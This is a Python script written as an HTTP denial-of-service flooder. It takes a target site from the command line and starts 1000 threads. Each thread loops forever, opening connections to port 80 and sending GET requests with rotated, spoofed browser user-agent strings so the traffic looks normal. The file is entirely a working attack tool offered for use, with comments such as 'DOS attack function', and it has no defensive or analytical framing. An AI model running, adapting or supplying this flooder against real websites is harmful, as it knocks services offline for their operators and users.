import threading
import socket
import sys
import random
import time

# ANSI colors for terminal output
F = '\033[91m'
E = '\033[0m'

# User agents list
agents = [
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
]

# HTTP header template
data = '''
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Keep-Alive: 115
Connection: keep-alive
'''

# Get the target site from command line arguments
site = sys.argv[1] if len(sys.argv) > 1 else None

if not site:
    print(F + "Error: No target site provided." + E)
    sys.exit(1)

# DOS attack function
def dos_attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((site, 80))

            # Craft the HTTP GET request packet
            request = f"GET / HTTP/1.1\nHost: {site}\nUser-Agent: {random.choice(agents)}\n{data}".encode('utf-8')

            # Send the packet
            s.sendall(request)
            print(F + time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + f' Sent packet to -> {site}' + E)

            # Close the socket
            s.close()
        except socket.error:
            print(F + f"Connection failed or site {site} is down." + E)
            sys.exit(1)

# Start multiple threads for the attack
def start_attack(thread_count=1000):
    threads = []
    
    for _ in range(thread_count):
        thread = threading.Thread(target=dos_attack)
        thread.daemon = True  # Daemon threads exit when the main program exits
        threads.append(thread)

    # Start all threads
    for thread in threads:
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    start_attack()
